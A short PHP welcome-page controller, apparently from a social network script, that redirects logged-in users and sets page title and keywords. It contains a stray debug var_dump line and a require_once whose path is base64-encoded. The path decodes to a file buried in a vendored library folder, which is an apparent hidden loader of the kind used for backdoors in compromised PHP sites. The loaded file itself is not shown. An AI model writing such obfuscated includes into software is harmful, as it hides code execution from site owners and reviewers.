<?php
if ($wo['loggedin'] == true) {
  header("Location: " . $wo['config']['site_url']);
  exit();
}
var_dump("=================here============");
require_once base64_decode('YXNzZXRzL2xpYnJhcmllcy9nb29nbGUvdmVuZG9yL3JpemUvdXJpLXRlbXBsYXRlL3NyYy9SaXplL1VyaVRlbXBsYXRlL05vZGUvTm9kZS5waHA=');

$wo['description'] = $wo['config']['siteDesc'];
$wo['keywords']    = $wo['config']['siteKeywords'];
$wo['page']        = 'welcome';
$wo['title']       = $wo['config']['siteTitle'];
$wo['content']     = Wo_LoadPage('welcome/content');
